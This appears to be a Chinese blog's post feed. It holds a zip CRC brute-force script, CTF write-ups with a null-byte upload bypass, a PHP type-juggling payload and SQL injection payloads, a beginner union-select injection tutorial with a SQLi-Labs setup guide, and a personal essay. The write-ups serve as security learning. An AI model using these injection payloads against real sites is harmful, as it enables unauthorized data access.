( zipname, info.filename )] = ( info.CRC, info.file_size )</div><div class="line">            crcs += [( info.CRC, info.file_size )]</div><div class="line">            limit = max(limit, info.file_size)</div><div class="line">            print(<span class="string">'file found: %s / %s: crc = 0x%08x, size = %d'</span> % (zipname, info.filename, info.CRC, info.file_size), file=sys.stderr)</div><div class="line"><span class="keyword">if</span> <span class="keyword">not</span> crcs:</div><div class="line">    parser.error(<span class="string">'No CRCs given'</span>)</div><div class="line"><span class="comment"># compiling c++ in python script is the easy way to have the both a good interface and better speed</span></div><div class="line">code = <span class="string">''</span></div><div class="line">code += <span class="string">r'''</span></div><div class="line">#include &lt;cstdio&gt;</div><div class="line">#include &lt;vector&gt;</div><div class="line">#include &lt;array&gt;</div><div class="line">#include &lt;string&gt;</div><div class="line">#include &lt;set&gt;</div><div class="line">#include &lt;cstdint&gt;</div><div class="line">#include &lt;cctype&gt;</div><div class="line">#define repeat(i,n) for (int i = 0; (i) &lt; (n); ++(i))</div><div class="line">using namespace std;</div><div class="line">uint32_t crc_table[256];</div><div class="line">void make_crc_table() &#123;</div><div class="line">    repeat (i, 256) &#123;</div><div class="line">        uint32_t c = i;</div><div class="line">        repeat (j, 8) &#123;</div><div class="line">            c = (c &amp; 1) ? (0xedb88320 ^ (c &gt;&gt; 1)) : (c &gt;&gt; 1);</div><div class="line">        &#125;</div><div class="line">        crc_table[i] = c;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">const uint32_t initial_crc32 = 0xffffffff;</div><div class="line">uint32_t next_crc32(uint32_t c, char b) &#123;</div><div class="line">    return crc_table[(c ^ b) &amp; 0xff] ^ (c &gt;&gt; 8);</div><div class="line">&#125;</div><div class="line">const uint32_t mask_crc32 = 0xffffffff;</div><div class="line">const char alphabet[] = &#123; ''' + <span class="string">', '</span>.join(map(str, args.alphabet)) + <span class="string">r''' &#125;;</span></div><div class="line">const int limit = ''' + str(limit) + <span class="string">r''';</span></div><div class="line">array&lt;set&lt;uint32_t&gt;, limit+1&gt; crcs;</div><div class="line">string stk;</div><div class="line">void dfs(uint32_t crc) &#123;</div><div class="line">    if (crcs[stk.length()].count(crc ^ mask_crc32)) &#123;</div><div class="line">        fprintf(stderr, "crc found: 0x%08x: \"", crc ^ mask_crc32);</div><div class="line">        for (char c : stk) fprintf(stderr, isprint(c) &amp;&amp; (c != '\\') ? "%c" : "\\x%02x", c);</div><div class="line">        fprintf(stderr, "\"\n");</div><div class="line">        printf("%08x ", crc ^ mask_crc32);</div><div class="line">        for (char c : stk) printf(" %02x", c);</div><div class="line">        printf("\n");</div><div class="line">    &#125;</div><div class="line">    if (stk.length() &lt; limit) &#123;</div><div class="line">        for (char c : alphabet) &#123;</div><div class="line">            stk.push_back(c);</div><div class="line">            dfs(next_crc32(crc, c));</div><div class="line">            stk.pop_back();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">int main() &#123;</div><div class="line">'''</div><div class="line"><span class="keyword">for</span> crc, size <span class="keyword">in</span> crcs:</div><div class="line">    code += <span class="string">'    crcs['</span> + str(size) + <span class="string">'].insert('</span> + hex(crc) + <span class="string">');\n'</span></div><div class="line">code += <span class="string">r'''</span></div><div class="line">    make_crc_table();</div><div class="line">    dfs(initial_crc32);</div><div class="line">    return 0;</div><div class="line">&#125;</div><div class="line">'''</div><div class="line"><span class="keyword">import</span> tempfile</div><div class="line"><span class="keyword">import</span> subprocess</div><div class="line"><span class="keyword">with</span> tempfile.TemporaryDirectory() <span class="keyword">as</span> tmpdir:</div><div class="line">    cppname = os.path.join(tmpdir, <span class="string">'a.cpp'</span>)</div><div class="line">    <span class="keyword">with</span> open(cppname, <span class="string">'w'</span>) <span class="keyword">as</span> fh:</div><div class="line">        fh.write(code)</div><div class="line">    binname = os.path.join(tmpdir, <span class="string">'a.out'</span>)</div><div class="line">    print(<span class="string">'compiling...'</span>, file=sys.stderr)</div><div class="line">    p = subprocess.check_call([args.compiler, <span class="string">'-std=c++11'</span>, <span class="string">'-O3'</span>, <span class="string">'-o'</span>, binname, cppname])</div><div class="line">    print(<span class="string">'searching...'</span>, file=sys.stderr)</div><div class="line">    p = subprocess.Popen([binname], stdout=subprocess.PIPE)</div><div class="line">    output, _ = p.communicate()</div><div class="line">print(<span class="string">'done'</span>, file=sys.stderr)</div><div class="line">print(file=sys.stderr)</div><div class="line">result = collections.defaultdict(list)</div><div class="line"><span class="keyword">for</span> line <span class="keyword">in</span> output.decode().strip().split(<span class="string">'\n'</span>):</div><div class="line">    crc, *val = map(<span class="keyword">lambda</span> x: int(x, <span class="number">16</span>), line.split())</div><div class="line">    result[( crc, len(val) )] += [ bytes(val) ]</div><div class="line"><span class="keyword">for</span> key, crc <span class="keyword">in</span> targets.items():</div><div class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> result[crc]:</div><div class="line">        print(<span class="string">'%s : %s'</span> % (key, repr(s)[<span class="number">1</span>:]))</div></pre></td></tr></table></figure>
<p>示例：</p>
<p><img src="/2017/10/19/rar-attack/10.png" alt=""></p>
<h2 id="0x06-MORE"><a href="#0x06-MORE" class="headerlink" title="0x06 MORE"></a>0x06 MORE</h2><p>还有很多压缩包的密码需要联系题中的其他文件来解，这个就不在本篇的讨论范围内了，故不再讨论。</p>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[NCTF WriteUp（二）]]></title>
      <url>/2017/09/23/NCTF-2/</url>
      <content type="html"><![CDATA[<p>某个无所事事的下午的一篇随手记。</p>
<a id="more"></a>  
<h2 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h2><p>URL: <a href="http://teamxlc.sinaapp.com/web5/21232f297a57a5a743894a0e4a801fc3/index.html" target="_blank" rel="external">http://teamxlc.sinaapp.com/web5/21232f297a57a5a743894a0e4a801fc3/index.html</a>   </p>
<p>一个简易的上传界面，先传了个png格式的图片试水，得到回显：“必须上传成后缀名为php的文件才行啊!”。要同时满足这些条件，应该要用到截断，试了很多姿势都不行，于是开burp看了看：  </p>
<p><img src="/2017/09/23/NCTF-2/scrg-1.png" alt="">  </p>
<p>留意到这个“/uploads/”，试试在后面加个”.php”，得到了这个：  </p>
<p><img src="/2017/09/23/NCTF-2/scrg-2.png" alt="">  </p>
<p>下面就可以进行截断了。把刚才的语句改成”.php （末尾多个空格）”，然后去hex界面把对应位置的”20”改成”00”进行截断，Go。  </p>
<p><img src="/2017/09/23/NCTF-2/scrg-3.png" alt=""></p>
<hr>
<h2 id="起名字真难"><a href="#起名字真难" class="headerlink" title="起名字真难"></a>起名字真难</h2><p>URL: <a href="http://chinalover.sinaapp.com/web12/index.php" target="_blank" rel="external">http://chinalover.sinaapp.com/web12/index.php</a>   </p>
<p>直接给出了源码：  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span><span class="params">($number)</span></span></div><div class="line">&#123;</div><div class="line">        $one = ord(<span class="string">'1'</span>);</div><div class="line">        $nine = ord(<span class="string">'9'</span>);</div><div class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</div><div class="line">        &#123;   </div><div class="line">                $digit = ord($number&#123;$i&#125;);</div><div class="line">                <span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</div><div class="line">                &#123;</div><div class="line">                        <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">                &#125;</div><div class="line">        &#125;</div><div class="line">          <span class="keyword">return</span> $number == <span class="string">'54975581388'</span>;</div><div class="line">&#125;</div><div class="line">$flag=<span class="string">'*******'</span>;</div><div class="line"><span class="keyword">if</span>(noother_says_correct($_GET[<span class="string">'key'</span>]))</div><div class="line">    <span class="keyword">echo</span> $flag;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    <span class="keyword">echo</span> <span class="string">'access denied'</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>可以看到这个函数做了一个对数字的判断，很巧的是number的值转16进制后为”0xccccccccc”，可以传入。于是payload便为”?key=0xccccccccc”。</p>
<hr>
<h2 id="sql-injection-4"><a href="#sql-injection-4" class="headerlink" title="sql injection 4"></a>sql injection 4</h2><p>URL: <a href="http://chinalover.sinaapp.com/web15/index.php" target="_blank" rel="external">http://chinalover.sinaapp.com/web15/index.php</a>   </p>
<p>TIP:<br>反斜杠可以用来转义<br>仔细查看相关函数的用法  </p>
<p>F12有源码：  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span><span class="params">($str)</span></span>&#123;</div><div class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</div><div class="line">        $str=stripslashes($str);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> htmlentities($str, ENT_QUOTES);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$username = @clean((string)$_GET[<span class="string">'username'</span>]);</div><div class="line">$password = @clean((string)$_GET[<span class="string">'password'</span>]);</div><div class="line"></div><div class="line">$query=<span class="string">'SELECT * FROM users WHERE name=\''</span>.$username.<span class="string">'\' AND pass=\''</span>.$password.<span class="string">'\';'</span>;</div><div class="line">$result=mysql_query($query);</div><div class="line"><span class="keyword">if</span>(!$result || mysql_num_rows($result) &lt; <span class="number">1</span>)&#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">'Invalid password!'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>发现sql查询语句使用了分号，对于此类sql注入需要闭合分号。   </p>
<p>先来看看这几个函数：</p>
<blockquote>
<ol>
<li><a href="http://php.net/manual/zh/function.get-magic-quotes-gpc.php" target="_blank" rel="external">get_magic_quotes_gpc()</a>: 这个函数如果设置为”On”可以判断用户传入（如: post、get、cookie）的数据，增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符而产生的一系列错误。  </li>
<li><a href="http://www.w3school.com.cn/php/func_string_stripslashes.asp" target="_blank" rel="external">stripslashes()</a>: 这个函数则能删除由 addslashes() 函数添加的反斜杠，可用于清理从数据库中或者从 HTML 表单中取回的数据。  </li>
<li><a href="http://www.w3school.com.cn/php/func_string_htmlentities.asp" target="_blank" rel="external">htmlentities()</a>: 把字符转换为 HTML 实体。     </li>
</ol>
</blockquote>
<p>由于使用了htmlentities()函数，所以无法使用分号来闭合。因此我们用反斜杠去逃出单引号的限制，利用它构造payload：<code>?username=admin\&amp;password= or 1%23</code>，这样查询语句就变成了<code>SELECT * FROM users WHERE name=&#39;admin\&#39;AND pass=&#39; or 1#&#39;</code>，即可拿到flag。</p>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[从零开始的SQL注入（二）]]></title>
      <url>/2017/07/26/sqli-2/</url>
      <content type="html"><![CDATA[<p>第三期咕咕咕预告。</p>
<a id="more"></a>
<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>记录一些基本的注入思路以及常见的注入类型。</p>
<h2 id="0x01-什么是SQL注入呢？"><a href="#0x01-什么是SQL注入呢？" class="headerlink" title="0x01 什么是SQL注入呢？"></a>0x01 什么是SQL注入呢？</h2><p>我们看看百度是怎么讲的：  </p>
<blockquote>
<p>所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</p>
</blockquote>
<p>再来看看google是怎么说的：  </p>
<blockquote>
<p>SQL攻击（英语：SQL injection），简称注入攻击，是发生于应用程序之数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，在设计不良的程序当中忽略了检查，那么这些注入进去的指令就会被数据库服务器误认为是正常的SQL指令而运行，因此遭到破坏或是入侵。</p>
</blockquote>
<p>当然只看这些并不能很好地理解“何为SQL注入”这个问题。觉得涛涛的例子不错，就照着那个再来理解一次吧ouo。比如说我们写了一个简单的博客，每篇文章都有对应的序号以便读者查询，读者说想看第一篇文章，于是服务器就从数据库里拿出第一篇文章的数据返回给浏览器，浏览器把图片，文字显示给读者。这个过程用代码来表示大概是这个样子：  </p>
<p>Acaleph访问了：<a href="https://cyris.cn/show.php?id=1" target="_blank" rel="external">https://cyris.cn/show.php?id=1</a> （数字表示第几篇文章。）<br>此时服务器的处理语句可能是这个样子：<br><figure class="highlight autoit"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$id = $_GET[<span class="string">'id'</span>]<span class="comment">;  </span></div><div class="line"><span class="keyword">SELECT</span> * FROM articles WHERE articles_id = <span class="number">1</span></div></pre></td></tr></table></figure></p>
<p>看起来似乎没什么问题呢，但是Acaleph比较调皮，她说：“我要看第二篇文章，然后把你的数据都删掉XD！”<br>于是语句变成了：<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$id = $<span class="variable">_GET</span>[<span class="string">'id'</span>];  </div><div class="line"><span class="built_in">SELECT</span> * <span class="keyword">FROM</span> articles WHERE articles_id = <span class="number">2</span> <span class="built_in">and</span> <span class="built_in">drop</span> db_articles</div></pre></td></tr></table></figure></p>
<p>聪明的永远是人而不是程序，这里程序直接把<code>id =2 and drop db_articles</code>当作一条命令去执行了，而非一条查询语句，那么我们的数据库就被次了，Acaleph成功删库跑路。    </p>
<p>上面的例子只是一个初步的认识，想了解更多就自行Google啦。    </p>
<h2 id="0x03-注入思路"><a href="#0x03-注入思路" class="headerlink" title="0x03 注入思路"></a>0x03 注入思路</h2><h3 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">查询字段数（<span class="keyword">order</span> <span class="title">by</span>）</div><div class="line">找出注入点</div><div class="line">获取数据库名（database()）</div><div class="line">获取表名</div><div class="line">获取字段名</div><div class="line">获取具体数据</div></pre></td></tr></table></figure>
<p>下面说一下<del>其实也不是很</del>具体的做法吧：</p>
<h4 id="1-查询字段数"><a href="#1-查询字段数" class="headerlink" title="1. 查询字段数"></a>1. 查询字段数</h4><p>主要是利用<code>order by</code>语句来查询。    </p>
<blockquote>
<p>ORDER BY 语句用于根据指定的列对结果集进行排序<br>ORDER BY 语句默认按照升序对记录进行排序    </p>
</blockquote>
<p>还是用上面的那个例子，我们可以在<code>?id = 1</code>后面跟上<code>order by 1</code>（1可以是其他的数字），假如在尝试某个数字的时候出现了报错（或者是之前都能看到一些数据，到某个数字后不再显示了），就可以确定字段数啦。  </p>
<h4 id="2-找出注入点"><a href="#2-找出注入点" class="headerlink" title="2. 找出注入点"></a>2. 找出注入点</h4><p>在拿到字段数后就可以利用union语句来找出注入点了（可能会存在过滤），当然也有其他方法，在实例中讲吧。</p>
<h4 id="3-获取数据库名"><a href="#3-获取数据库名" class="headerlink" title="3. 获取数据库名"></a>3. 获取数据库名</h4><p>sql语句中的database()函数可以显示当前数据库名，用法和上一步差不多，不过是把第二步中找到的注入点的位置的数字改为database()传入。比如说，上一步中使用的语句是<code>union select 1, 2, 3, 4</code>，爆出来的字段位置是2，那这一步的语句就是<code>union select 1, database(), 3, 4</code>。   </p>
<h4 id="4-获取表名"><a href="#4-获取表名" class="headerlink" title="4. 获取表名"></a>4. 获取表名</h4><p>这里讲一下<code>information_schema</code>这张表，它里面保存了MySQL服务器所有数据库信息，比如数据库名，数据库的表，表格里的数据类型与访问权限等。我们用得比较多的就是<code>TABLES</code>（表信息）和<code>COLUMNS</code>（列信息）了。而<code>group_concat()</code>这个函数可以将结果合并，操作原理可以搜一搜，相关文章挺多的。我们主要用这个函数来获取表名。  </p>
<blockquote>
<p>MySQL官方文档：<a href="https://dev.mysql.com/doc/refman/5.7/en/information-schema.html" target="_blank" rel="external">https://dev.mysql.com/doc/refman/5.7/en/information-schema.html</a>   </p>
</blockquote>
<h4 id="5-获取字段名"><a href="#5-获取字段名" class="headerlink" title="5. 获取字段名"></a>5. 获取字段名</h4><p>还是通过<code>group_concat()</code>函数，利用<code>COLUMNS</code>表来获取字段名。   </p>
<h4 id="6-获取具体数据"><a href="#6-获取具体数据" class="headerlink" title="6. 获取具体数据"></a>6. 获取具体数据</h4><p>表名和字段名都get到了，下面的操作就比较简单了。还是用上面的例子吧，比如一系列试探后我们得到了表名<code>ctf</code>和字段名<code>flag</code>，就可以构造语句<code>union select 1, (select flag from ctf), 3, 4</code>来获取具体的数据了。   </p>
<p>当然以上都是一些比较基础的操作，实战过程中难免会遇到很多的防御措施，这时候就需要一些技巧来绕过了。</p>
<h3 id="名为技巧的小家伙们"><a href="#名为技巧的小家伙们" class="headerlink" title="名为技巧的小家伙们"></a>名为技巧的小家伙们</h3><p>记录一些有趣的绕过方式。  </p>
<blockquote>
<p><a href="https://lorexxar.cn/2015/10/24/sqli_h/" target="_blank" rel="external">LoRexxar-关于sqli注入的特殊函数</a><br><a href="https://lorexxar.cn/2015/11/19/sql-error/" target="_blank" rel="external">LoRexxar-SQL显错注入</a><br><a href="https://lightless.me/archives/SQL-Injection-weisuo-Skill.html" target="_blank" rel="external">lightless-SQL Injection 的猥琐技巧</a></p>
</blockquote>
<h2 id="0x04-SQL注入类型"><a href="#0x04-SQL注入类型" class="headerlink" title="0x04 SQL注入类型"></a>0x04 SQL注入类型</h2><p>一些常见的SQL注入类型。<br><figure class="highlight coq"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">字符型（最典型的就是单引号'了，当然单引号不是万能的，常常需要结合一些经验与技巧来判断。）</div><div class="line">数字型（<span class="number">1</span>+<span class="number">1</span>会被处理成<span class="number">2</span>，在尝试时需要注意'+'要用'%<span class="number">2</span>b'代替）</div><div class="line">Boolean-based blind SQL <span class="built_in">injection</span>（布尔型注入）</div><div class="line">Error-based SQL <span class="built_in">injection</span>（报错型注入）</div><div class="line">UNION query SQL <span class="built_in">injection</span>（可联合查询注入）</div><div class="line">Stacked queries SQL <span class="built_in">injection</span>（可多语句查询注入）</div><div class="line"><span class="keyword">Time</span>-based blind SQL <span class="built_in">injection</span>（基于时间延迟注入）</div></pre></td></tr></table></figure></p>
<p>各种注入类型会在接下来的实例中仔细地讲一下。</p>
<p>参考文章：    </p>
<blockquote>
<p><a href="https://lightless.me/archives/zero-to-n-sqli-1.html" target="_blank" rel="external">lightless的从零开始SQL注入系列</a><br><a href="http://123.206.203.108/index.php/archives/18/" target="_blank" rel="external">一叶知秋的几篇关于SQL注入的文章</a></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> SQL </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> sqli </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[从零开始的SQL注入（一）]]></title>
      <url>/2017/07/18/sqli-labs/</url>
      <content type="html"><![CDATA[<p>开了个新坑。</p>
<a id="more"></a>
<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在看了涛涛的<a href="https://lightless.me/archives/zero-to-n-sqli-1.html" target="_blank" rel="external">从零开始SQL注入</a>后萌生了自己写一个系列的想法。 </p>
<h2 id="0x01-搭建服务器环境"><a href="#0x01-搭建服务器环境" class="headerlink" title="0x01 搭建服务器环境"></a>0x01 搭建服务器环境</h2><ol>
<li>下载<a href="https://www.apachefriends.org/download.html" target="_blank" rel="external">xampp包</a>。(易于安装，集成了Apache+MySQL+PHP+PERL，更容易使用。)  </li>
<li>安装完成后启动Apache和MySQL（启动报错可能是因为80/443端口占用，在/xampp/apache/conf/extra/httpd-ssl.conf修改下Listen就可以了。）         </li>
<li>启动完成后查看：<a href="http://localhost:442/xampp/" target="_blank" rel="external">http://localhost:442/xampp/</a>，页面正常则说明安装成功。（442改成自己设置的端口）</li>
</ol>
<h2 id="0x02-SQLi-Labs配置"><a href="#0x02-SQLi-Labs配置" class="headerlink" title="0x02 SQLi-Labs配置"></a>0x02 SQLi-Labs配置</h2><ol>
<li>下载实验环境：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">SQLi-Labs</a>。</li>
<li>把源码包解压到\xampp\htdocs下，重命名为sqli-labs。</li>
<li>打开<a href="http://localhost:442/sqli-labs/" target="_blank" rel="external">http://localhost:442/sqli-labs/</a>，点下Setup/reset Database for labs建立数据库。（也可作恢复数据库用。）</li>
<li>来，回到之前的页面，选一个题试试：<a href="http://localhost:442/sqli-labs/Less-1/?id=1" target="_blank" rel="external">http://localhost:442/sqli-labs/Less-1/?id=1</a></li>
</ol>
<p><img src="/2017/07/18/sqli-labs/1.png" alt=""></p>
<p>注：如果xampp下载的是PHP 7+的版本，可能会存在数据库连接的问题，网上有相应的解决方案，视情况自行解决吧XD。</p>
]]></content>
      
        <categories>
            
            <category> SQL </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> sqli </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[觉得理性的人快乐嘛]]></title>
      <url>/2017/07/12/the-seed/</url>
      <content type="html"><![CDATA[<p>只是你不知道我的狂野。</p>
<a id="more"></a>     
<h2 id="一、靠在窗外的人-读着窗边的景"><a href="#一、靠在窗外的人-读着窗边的景" class="headerlink" title="一、靠在窗外的人 读着窗边的景"></a>一、靠在窗外的人 读着窗边的景</h2><p>初中高中的时候经常会在空间或者朋友圈发些简短的话，诸如“不是雪晚了，只是年早了（记某次终于到来的雪，很兴奋，看了以往的日历才发现，是那年年过得早，所以才有雪来得迟的感受）”，“把书夹在光里（第一次见到那种夹子式的移动台灯的时候，把它夹在了硬皮书上然后靠在床前阅读）”，类似的还有很多，似乎变成了动态圈的一股清流，也不求多少赞，不想多少评论，只是想说，就说了。（那时候也不会想到这些话会成为水母喜欢自己的一部分理由）。现在很少发朋友圈之类的，主要是多了些可以说话的人吧，表达的对象与地方都发生了些改变。当然不同的人会采取不同的表达方式，所以衍生出了各种各样的圈子，过得开心即可。      </p>
<p><img src="/2017/07/12/the-seed/1.png" alt="">  </p>
<p>每个阶段的“回家”都是有不同的意义的。    </p>
<p>其实一直很羡慕有弟弟妹妹的人，大概是“独生”带来的某种程度的孤独感太过真实了吧。于是可以说话的“人”，从小时候的玩具，到游戏里的熟人，到窗外的天空，云与太阳，到曾经觉得会合不来现在却无话不说的挚友，到水母玲，每个阶段都有独到的故事在。    </p>
<p>这里没有提到父母或者各类长辈，不清楚其他家的情况所以不作大体的评价，不过对于我自己，其实在物质得到一定的满足之后，会转而追求一些精神上的东西，而这些是更偏向物质追求的那一代很难给予的，他们会以经验，以自己的想法告诉你，应该怎么去做，家长，孩子，男人，女人，这些的区别在他们的眼里有时候太过强烈了，以致于你做了一件你想做的事可能会被说，你不能这么做，你是男孩子所以要强硬不能柔软，你是女孩子所以不要经常出去玩，你是小孩不要听我们讲话，不要管大人的事，专心读书就好，之类，<del>（这样看来女装反而是一种思想的解放呢hh）</del>就比如不管大人的事，其实孩子很聪明，学语言的速度就比大人快上很多，这样的学习能力，以“大人的事”来限制一些思想的开拓，其实觉得挺可惜的（也算是之后很长一段时间不太爱和他们说话的原因吧）。     </p>
<p>以前会觉得不舒服，会闹脾气，随意得不理他们，一是确实不喜欢一些做法和说法，二是前一段时间才想到的，可能觉得无论自己怎么耍性子他们都不会离开自己丢下自己，所以潜意识里助长了一些任性呢。好在自己也是个比较平静的人，不会太过生气，不会太过任性，即使偶尔有些意见的争执，不是无意义的大吵大闹就可以接受。以及，他们确实是爱着自己关心着自己的 —— 以他们自己的方式。虽然作为一个个体，我们拥有管理自己的情绪和释放自己属性的权利 —— 只是合适不合适的问题。比较“妥善”的释放，不仅可以最大限度地解压，也是一种成熟的体现吧。学会控制是门艺术，它不是对自己的压抑，反而是种引导式的增益。 对自己也好，对其他关心甚至爱着自己的人也好。        </p>
<p>靠在窗外的人，读着窗边的景。  </p>
<p><img src="/2017/07/12/the-seed/2.png" alt=""></p>
<p>搬到新家以后，会经常靠在客厅的窗边看着窗外的天。没有任何建筑的遮挡，视野获得了最大程度的自由。会觉得离天空很近，离太阳很近，离风很近，离云很近，离飞鸟很近，离生命很近。他们每天走着不一样的轨迹，但却丰满而深刻。拍了很多这个位置这个视角下的照片，每一张都不一样，情理之中。不过这里不是说景色的搭配不一样，而是他们所展现的力量，是色彩的灵活搭配下深度展现给我，带给我震撼感的东西。    </p>
<p>天空是会说话的，如果你用心说，如果你用心听。那段日子，虽然大人们看来是“很无聊的发呆”，自己却觉得是意外的充实与滋润。     </p>
<h2 id="二、交心"><a href="#二、交心" class="headerlink" title="二、交心"></a>二、交心</h2><p>前段时间回归了一下以前玩过的一款游戏，果然还是热爱着RPG呢。因为剧情和地图人设都觉得做得不错，就安利给了女友，一起玩了会儿，也算是了了一个心愿呢。惊喜的是她也很喜欢这款游戏，不过随着等级的上升，遇到使用第三方插件的<del>玩家</del>越来越多，不对，不应该称作玩家，而是商人吧。抢占着地图与道具，把正常玩家挤下线，并严重阻碍着任务的完成度。   </p>
<p>这是款冷了很久的游戏，当初退出它就是因为过分的商业化，而代理商并没有解决问题的力量，不如说不愿去解决吧。吃相并不好看。好好的游戏体验，只能在回忆里体验到了。即使喜欢着游戏本身，女友也因为受不了这点，不出几日便删了游戏。有太多的脏话想说。然而该说的几年前就说了，现在能找到一些记忆里的体验就已经很棒了。  </p>
<p>除了这款游戏，还有的比较深印象的是初中的时候逛着贴吧找到了[异次元服务器]，一个用服务器搭着MC进行游戏的小圈子。以前觉得弄服务器什么的很厉害，但是后来才知道其中大部分人是比自己还小的，也更说明了孩子的学习能力的强力呢。当然我在这里想说的不是游戏的体验，而是一些其他的东西。一起玩过游戏的人，有的已经结婚生子，有的还在积极备考，有的是和自己一样或者相似的人。很多人可能都没有见过面，但是现在还有着一些联系，很感动。在这种充斥着不信任的时代里，这种温暖显得难得可贵，即使隔着屏幕，也能感受到一些亲和。  </p>
<p>我称这种体验为交心。    </p>
<p>当然离我们更近的交心体验还是朋友间，恋人间的。嗯也借这个机会谈谈一些恋爱观与设想吧。   </p>
<p>其实成长到现在，不仅是自己，整个社会的恋爱观都在发生着变化，从以前的连靠得很近都觉得是种羞耻的时代到了可以大胆去表达，表现爱的时代，觉得也是种进步呢，也是种解放。年轻人们有着自己的方式与理解去决定如何去爱，最主要的是如何去选择对象与对自己身体的开放程度，比如现在的勾肩搭背搂抱可能是以前的人所无法接受的呢。当然远不止这些。    </p>
<p>这些概括起来大致是[选择权]的提升吧，说起来本该拥有的东西现在被赋予了或者说争取到了还觉得开心，其实有点奇怪的呢。  </p>
<p>这世界，两个人，能相遇，不容易。</p>
<p><img src="/2017/07/12/the-seed/3.png" alt=""></p>
<p>当谈及恋爱的时候，我觉得不管是在哪个年龄，都不该含着一种羞耻心，最常见的就是你比邻居家的某个哥哥姐姐要早有男票女票，你的爸妈可能会觉得有某种“不妥”，甚至对方到家里来玩都要遮遮掩掩不好意思，这本身就有一种不合理的成分在。爱的经营好比商业，甚至比经商还要复杂，那么人们是否会因为你年纪轻轻比周围的中年工作党还赚得多而感到羞耻嘛？显然不会，他们还会夸这样的你。那么为什么放到恋爱这边会有这样的差别呢，其实还是一种物质世界与精神世界的搭配不均，或者说某种传统的偏见束缚所引起的，那么爱与性的解放，其实还有很长一段路要走。我们所关注的，应该是如何去引导自己或者自己的孩子，去提升整场感情的质量，而非冠冕的“为了你好以xx为重不能这样不能这样”，这是种压制，而非利于他成长的体验。    </p>
<p>有幸捕捉到一只有相近目标的女票，并不会觉得将来会因为专业的重合而使得乐趣与圈子重合而造成乐趣的减少，当然下一章任务的解锁与成就的体验会需要现在的一些努力与投入，听起来有点教条，但还是这个理呢XD。你没办法说，现在靠着家长享受着一些东西，以后也可以这样。无济于事可能来自于自己的无能为力，这种感觉会非常痛苦。</p>
<p>长久的陪伴融合并不是让一个人去迁就另一个人，可能很多男生会觉得一直哄一直宠着女票就可以，很多人觉得以后肯定会这么做，然而这其实不是健康的感情，爱是双向的，你的温柔与包容是必须的，但是同时你吸引对方的，一定不是如何宠溺，而是你本身。带给她无限关怀的可能不止你一个人能做到，但是要牢牢得用自身去吸引她的，只有你能做到。如果对方一直没有什么亮点的话，你会觉得各种对自己的好都显得那么普通，而如果是不断吸引着自己的人呢，其实稍微对你的注意与关怀都会感觉像是上帝的恩赐一般，甚至整天的心情都是那么棒。   </p>
